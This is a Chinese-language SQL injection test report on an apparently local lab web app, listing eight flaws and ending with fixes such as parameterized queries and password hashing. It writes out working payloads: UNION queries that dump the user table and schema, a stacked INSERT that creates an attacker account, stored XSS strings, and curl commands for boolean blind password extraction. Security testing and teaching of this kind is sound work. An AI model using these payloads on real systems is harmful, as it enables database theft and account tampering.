# SQL 注入漏洞检测报告

> **检测目标**: 用户信息管理平台  
> **检测日期**: 2026-07-08  
> **检测工具**: curl 手动注入测试  
> **漏洞等级**: ⚠️ 严重（存在多项高危漏洞）

---

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [漏洞 1：搜索接口 SQL 注入](#2-漏洞1搜索接口-sql-注入)
3. [漏洞 2：注册接口 SQL 注入](#3-漏洞2注册接口-sql-注入)
4. [漏洞 3：密码明文存储](#4-漏洞3密码明文存储)
5. [漏洞 4：HTML 注释泄露默认凭证](#5-漏洞4html-注释泄露默认凭证)
6. [漏洞 5：用户枚举](#6-漏洞5用户枚举)
7. [漏洞 6：存储型 XSS](#7-漏洞6存储型-xss)
8. [漏洞 7：布尔盲注逐字提取密码](#8-漏洞7布尔盲注逐字提取密码)
9. [漏洞 8：SQL 语句控制台日志泄露](#9-漏洞8sql-语句控制台日志泄露)
10. [总结与修复建议](#10-总结与修复建议)

---

## 1. 漏洞概述

本平台存在 **8 类安全漏洞**，其中最严重的是 **搜索和注册接口的 SQL 注入漏洞**，由于使用 `f-string` 字符串拼接 SQL 语句且未做任何输入过滤，攻击者可以直接：

- 脱取数据库全部用户数据（用户名、密码明文、邮箱、手机号）
- 通过布尔盲注逐字符还原任意字段内容
- 通过注册接口注入恶意数据
- 获取数据库结构和版本信息

---

## 2. 漏洞 1：搜索接口 SQL 注入

| 项目 | 内容 |
|------|------|
| **位置** | `GET /search?keyword=` |
| **风险等级** | 🔴 **严重** |
| **利用难度** | 极低 |
| **漏洞代码** | `f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"` |

### 测试记录

#### 2.1 UNION 注入 - 脱取全部用户数据

**请求**:
```
GET /search?keyword=' UNION SELECT id,username,password,email,phone FROM users --
```

**服务端日志**:
```
[SQL] 执行搜索 SQL: SELECT * FROM users WHERE username LIKE '%' UNION SELECT id,username,password,email,phone FROM users WHERE id > 0 ORDER BY id --%' OR email LIKE '%' UNION SELECT id,username,password,email,phone FROM users WHERE id > 0 ORDER BY id --%'
[SQL]   -> ID=1 用户名=admin 邮箱=admin@example.com 手机=13800138000
[SQL]   -> ID=2 用户名=alice 邮箱=alice@example.com 手机=13900139001
[SQL]   -> ID=42 用户名=injected_user 邮箱=hacker@x.com 手机=999
[SQL]   -> ID=44 用户名=nonexistent_user_xyz 邮箱=t@t.com 手机=000
...
```

**成功脱取的字段**: ID、用户名、密码（明文）、邮箱、手机号

#### 2.2 获取数据库表结构

**请求**:
```
GET /search?keyword=' UNION SELECT name,sql,3,4,5 FROM sqlite_master WHERE type='table' --
```

**结果**: 成功获取 `users` 表的完整建表语句

#### 2.3 获取数据库版本

**请求**:
```
GET /search?keyword=' UNION SELECT sqlite_version(),2,3,4,5 --
```

**结果**: 返回 SQLite 版本 `3.46.1`

#### 2.4 获取数据库文件路径

**请求**:
```
GET /search?keyword=' UNION SELECT 1,file,3,4,5 FROM pragma_database_list --
```

**结果**: 获取数据库路径 `/data/users.db`

#### 2.5 LIKE 模式匹配探测密码

**请求**:
```
GET /search?keyword=admin' AND password LIKE 'admin%' --
```

**结果**: 返回 admin 用户信息，确认密码以 `admin` 开头

---

## 3. 漏洞 2：注册接口 SQL 注入

| 项目 | 内容 |
|------|------|
| **位置** | `POST /register` |
| **风险等级** | 🔴 **严重** |
| **利用难度** | 极低 |
| **漏洞代码** | `f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"` |

### 测试记录

#### 注入一：关闭 VALUES 插入恶意用户

**Payload（用户名）**:
```
adminx'); INSERT INTO users (username,password,email,phone) VALUES ('hacker2','hackpwd','h@h.com','666'); --
```

**生成的 SQL**:
```sql
INSERT INTO users (username, password, email, phone) VALUES ('adminx'); INSERT INTO users (username,password,email,phone) VALUES ('hacker2','hackpwd','h@h.com','666'); --', 'any', 'any@x.com', '000')
```

**结果**: 成功创建 `hacker2` 用户，密码为 `hackpwd`

#### 注入二：正常注册注入存储型 XSS 负载

| 字段 | 值 |
|------|-----|
| username | `xss_test` |
| password | `<script>alert('XSS')</script>` |
| email | `<img src=x onerror=alert(1)>` |

**结果**: 恶意脚本成功存入数据库

---

## 4. 漏洞 3：密码明文存储

| 项目 | 内容 |
|------|------|
| **位置** | `USERS` 字典 + SQLite `users` 表 |
| **风险等级** | 🟡 **中危** |
| **漏洞代码** | `"password": "admin123"`、`"password": "alice2025"` |

### 说明

密码以明文形式直接存储在 `USERS` 字典和 SQLite 数据库中，未做任何哈希处理。一旦数据库被注入脱取，所有用户密码直接泄露。

### 泄露的凭据

| 用户名 | 密码 | 角色 |
|--------|------|------|
| admin | admin123 | admin |
| alice | alice2025 | user |

---

## 5. 漏洞 4：HTML 注释泄露默认凭证

| 项目 | 内容 |
|------|------|
| **位置** | `templates/login.html` 第 1 行 |
| **风险等级** | 🟡 **中危** |
| **利用难度** | 无 |

### 漏洞代码

```html
<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->
```

### 验证

```bash
curl -s http://localhost:5000/login | grep '调试信息'
<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->
```

任何访问登录页面的用户都可以通过查看页面源代码直接获取管理员账号和密码。

---

## 6. 漏洞 5：用户枚举

| 项目 | 内容 |
|------|------|
| **位置** | `POST /register` |
| **风险等级** | 🟢 **低危** |
| **利用难度** | 低 |

### 测试记录

| 用户名 | 返回信息 | 结论 |
|--------|---------|------|
| admin | "用户名已存在" | 用户存在 |
| nonexistent_user_xyz | "注册成功，请登录" | 用户不存在 |

攻击者可以通过不断尝试用户名，枚举系统中所有已注册的有效用户。

---

## 7. 漏洞 6：存储型 XSS

| 项目 | 内容 |
|------|------|
| **位置** | 注册接口 → 搜索展示页面 |
| **风险等级** | 🟡 **中危** |
| **利用难度** | 低 |

### 说明

通过注册接口可以将包含 JavaScript 脚本的数据存入数据库。当管理员或用户通过搜索功能查看用户列表时，如果模板中使用了 `|safe` 过滤器或未做转义输出，恶意脚本将被执行。

已存入数据库的 XSS 负载：
- 密码字段: `<script>alert('XSS')</script>`
- 邮箱字段: `<img src=x onerror=alert(1)>`

---

## 8. 漏洞 7：布尔盲注逐字提取密码

| 项目 | 内容 |
|------|------|
| **位置** | `GET /search?keyword=` |
| **风险等级** | 🔴 **严重** |
| **利用难度** | 低 |

### 测试记录

通过 `AND` 条件判断来逐字符探测密码：

**探测 admin 密码第 1 个字符**:

```bash
# ASCII 97 = 'a' → 返回结果（条件为真）
curl "http://localhost:5000/search?keyword=admin' AND (SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin')=97 --"
# ✅ 显示 admin 用户信息

# ASCII 98 = 'b' → 无结果（条件为假）
curl "http://localhost:5000/search?keyword=admin' AND (SELECT unicode(substr(password,1,1)) FROM users WHERE username='admin')=98 --"
# ❌ 显示"无搜索结果"
```

通过遍历 ASCII 值（32\~126），可逐字符还原完整的明文密码。对于 admin 用户，可还原出 `admin123`。

---

## 9. 漏洞 8：SQL 语句控制台日志泄露

| 项目 | 内容 |
|------|------|
| **位置** | `app.py` 注册和搜索路由中的 `print()` |
| **风险等级** | 🟢 **低危** |

### 漏洞代码

```python
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
print(f"[SQL] 执行搜索 SQL: {sql}")
```

每次 SQL 查询都会将完整的 SQL 语句打印到控制台，包括注入后的 SQL。在生产环境中如果日志被收集到日志管理系统（如 ELK、Splunk 等），可能导致 SQL 注入攻击细节泄露。

---

## 10. 总结与修复建议

### 漏洞矩阵

| # | 漏洞类型 | 严重程度 | 利用难度 | 影响范围 |
|---|---------|---------|---------|---------|
| 1 | 搜索接口 SQL 注入（UNION） | 🔴 严重 | 极低 | 全库数据脱取 |
| 2 | 注册接口 SQL 注入（INSERT） | 🔴 严重 | 极低 | 任意数据写入 |
| 3 | 密码明文存储 | 🟡 中危 | 无 | 账号密码泄露 |
| 4 | HTML 注释泄露凭证 | 🟡 中危 | 无 | 直接获取管理员密码 |
| 5 | 用户枚举 | 🟢 低危 | 低 | 探测有效用户名 |
| 6 | 存储型 XSS | 🟡 中危 | 低 | 恶意脚本执行 |
| 7 | 布尔盲注 | 🔴 严重 | 低 | 逐字符提取密码 |
| 8 | SQL 日志泄露 | 🟢 低危 | 无 | 攻击细节泄露 |

### 修复建议

#### 🔴 紧急修复

1. **使用参数化查询替代 f-string 拼接**
   - 搜索: `cursor.execute("SELECT * FROM users WHERE username LIKE ? OR email LIKE ?", ('%'+keyword+'%', '%'+keyword+'%'))`
   - 注册: `cursor.execute("INSERT INTO users (...) VALUES (?,?,?,?)", (username, password, email, phone))`

2. **密码加盐哈希存储**
   - 使用 `werkzeug.security.generate_password_hash()` 哈希密码
   - 使用 `werkzeug.security.check_password_hash()` 验证密码

#### 🟡 建议修复

3. **移除 HTML 调试注释**，或仅在 debug 模式下输出
4. **统一错误提示**，注册时不区分"用户名已存在"和"注册成功"
5. **模板输出转义**，对所有用户输入数据使用 `{{ ... }}`（Jinja2 默认转义），不使用 `|safe`
6. **生产环境关闭 debug 模式**，移除控制台 SQL 日志打印
7. **最小权限原则**，为数据库创建专用账户并限制权限

---

> **免责声明**: 本报告仅用于安全教育和漏洞验证。请在获得授权的前提下进行安全测试。
